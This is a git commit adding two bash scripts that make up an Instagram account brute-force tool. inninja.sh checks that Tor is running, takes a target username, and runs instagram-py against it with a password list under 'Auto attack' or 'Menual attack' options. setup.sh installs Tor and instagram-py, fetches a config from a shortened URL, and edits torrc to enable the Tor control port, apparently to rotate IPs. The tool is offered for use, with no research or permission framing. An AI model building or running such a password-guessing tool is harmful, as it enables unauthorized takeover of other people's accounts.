5dd2c21f18d88f29145d1671fc5d9dcc88751384
PRINCE KUMAR <56459297+princekrvert@users.noreply.github.com>
2021-10-26 07:49:41 +0530

    first commit for inninja
    this is the first commit

---
+++ inninja.sh
@@ -0,0 +1,59 @@
+#!/usr/bin/bash
+#Author prince kumar
+#Date 24 oct 2021
+#Make a function to show the maue option...
+#Trap the exit 
+trap out SIGINT
+trap out SIGTSTP
+# Make a function To user exit
+#Small banner to show 
+banner(){
+	clear
+	echo -e "\e[36;1m"
+	echo '      ___             ___  
+               (o o)           (o o) 
+              (  V  ) IPNINJA (  V  )
+            . --m-m-------------m-m--'
+	}
+
+out(){
+	echo ""
+	echo -e "\e[31;1m Exiting 🧐 "
+	echo -e "\e[32;1m   __________________  
+((                  ))
+ )) MADE BY PRINCE (( 
+((                  ))
+  ------------------  "
+	sleep 2
+	exit 1
+}
+#Check if tor is running or not...
+pgrep -x tor > /dev/null 2>&1
+if [[ $? -eq 0 ]];then
+	echo -e "\e[37;1m Tor is running.."
+else
+	echo -e "\e[37;1m Tor is not running, Please open new session and after starting tor run inpumch agaun"
+	exit 1
+fi
+
+#Ask the insta username..
+echo -ne "\e[36;1m Enter the username: "
+read inuser
+echo " "
+echo -e "\e[31;1m[01]\e[32;1m Auto attack"
+echo -e "\e[31;1m[02]\e[32;1m Menual attack"
+echo -ne ":: "
+read a_optn
+if [[ $a_aptn -eq "1" || $a_optn -eq "01" ]];then
+	echo "Auto attck.."
+	banner
+	instagram-py -u $inuser -pl Autopass.txt
+	
+elif [[ $a_aptn -eq "2" || $a_optn -eq "02" ]];then
+	echo -ne  "\e[35;1mPath to password  list: "
+	read p_path
+	banner
+	instagram-py -u $inuser -pl $p_path
+else 
+	echo "Invalid option [ kiya hacker banegaa re tuu] "
+fi
---
+++ setup.sh
@@ -0,0 +1,44 @@
+#!/usr/bin/bash
+# made by prince kumar 
+# thanks subham bhaiya 
+# date 22/10/2021
+# install all the requirememt 
+requirement(){
+	apt update && apt upgrade
+	apt-get install python 
+	apt-get install python2
+	apt-get install wget -y 
+	apt-get install tor -y 
+	apt-get install python3
+	pip3 install requests --upgrade
+	pip3 install requests[socks]
+	pip3 install stem
+	pip3 install instagram-py
+	wget -O ~/instapy-config.json "https://git.io/v5DGy"
+}
+requirement
+
+# make a banner for the this tool 
+banner(){
+    echo -e  "\e[32;1m"
+    echo '
+ ╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┓╋╋
+╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃╋╋
+┏┓━┓╋━━┓┓┏┓━┓╋━━┓┗━┓
+┣┫┏┓┓┏┓┃┃┃┃┏┓┓┏━┛┏┓┃
+┃┃┃┃┃┗┛┃┗┛┃┃┃┃┗━┓┃┃┃
+┗┛┛┗┛┏━┛━━┛┛┗┛━━┛┛┗┛
+╋╋╋╋╋┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋
+╋╋╋╋╋┛╋╋╋╋╋╋╋╋╋╋╋╋╋╋'
+echo -e "\e[33;1m MADE BY PRINCE"
+echo -e "\e[30;1m Babu bhaiya yee galat rasta hai👻"
+}
+
+# NOW TO EDIT THE TORCC FILE 
+cd ~
+cd ..
+cd usr/etc/tor 
+sed '/ControlPort/s/^#//' torrc > /dev/null 2>&1
+
+#now uncomment the line 
+
